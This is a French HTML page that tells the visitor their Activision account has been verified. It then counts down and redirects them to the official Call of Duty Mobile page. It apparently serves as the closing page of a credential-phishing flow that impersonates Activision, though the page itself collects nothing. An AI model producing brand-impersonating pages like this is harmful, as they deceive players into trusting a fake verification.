<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Vérification terminée</title>
  <style>
    body {
      font-family: 'Segoe UI', Arial, sans-serif;
      background: #0d0d0d;
      color: #e0e0e0;
      margin: 0;
      padding: 0;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      text-align: center;
    }

    .container {
      max-width: 500px;
      padding: 40px;
      background: rgba(26, 26, 26, 0.9);
      border-radius: 12px;
      box-shadow: 0 8px 30px rgba(0,0,0,0.7);
    }

    .check-circle {
      width: 100px;
      height: 100px;
      margin: 0 auto 30px;
      position: relative;
    }

    .check-circle svg {
      width: 100%;
      height: 100%;
      animation: checkAnim 1.2s ease-in-out forwards;
    }

    @keyframes checkAnim {
      0% { transform: scale(0.5); opacity: 0; }
      50% { transform: scale(1.2); }
      100% { transform: scale(1); opacity: 1; }
    }

    .spinner {
      display: none;
      width: 50px;
      height: 50px;
      border: 5px solid #444;
      border-top: 5px solid #4caf50;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    h1 {
      font-size: 28px;
      color: #4caf50;
      margin-bottom: 16px;
    }

    p {
      font-size: 18px;
      line-height: 1.5;
      margin-bottom: 30px;
    }

    .redirect-msg {
      font-size: 15px;
      color: #aaa;
      margin-top: 20px;
    }

    .countdown {
      font-size: 16px;
      color: #ff9800;
      font-weight: bold;
    }
  </style>
</head>
<body>

<div class="container">
  <div class="check-circle">
    <svg viewBox="0 0 100 100" fill="none" stroke="#4caf50" stroke-width="8" stroke-linecap="round" stroke-linejoin="round">
      <circle cx="50" cy="50" r="45" fill="none" stroke="#4caf50" stroke-width="6" opacity="0.3"/>
      <path d="M20 50 L40 70 L80 30" opacity="0"/>
    </svg>
  </div>

  <h1>Votre identité a été vérifiée avec succès !</h1>
  
  <p>Merci d’avoir confirmé votre compte Activision.<br>Votre sécurité est notre priorité.</p>

  <div class="spinner" id="spinner"></div>

  <p class="redirect-msg">
    Redirection automatique vers Call of Duty Mobile dans <span class="countdown" id="count">5</span> secondes...
  </p>
</div>

<script>
  // Animation du check vert
  setTimeout(() => {
    const path = document.querySelector('path');
    path.style.opacity = '1';
    path.style.animation = 'dash 1.2s ease-in-out forwards';
  }, 300);

  // Compte à rebours + redirection
  let seconds = 5;
  const countdownEl = document.getElementById('count');
  const spinner = document.getElementById('spinner');

  const interval = setInterval(() => {
    seconds--;
    countdownEl.textContent = seconds;

    if (seconds <= 0) {
      clearInterval(interval);
      spinner.style.display = 'block'; // montre le spinner pendant la redirection
      setTimeout(() => {
        window.location.href = "https://www.activision.com/games/call-of-duty/call-of-duty-mobile";
      }, 800); // petit délai supplémentaire pour montrer le spinner
    }
  }, 1000);
</script>

<style>
  @keyframes dash {
    to { stroke-dashoffset: 0; }
  }
  path {
    stroke-dasharray: 100;
    stroke-dashoffset: 100;
    transition: stroke-dashoffset 1.2s ease-in-out;
  }
</style>

</body>
</html>
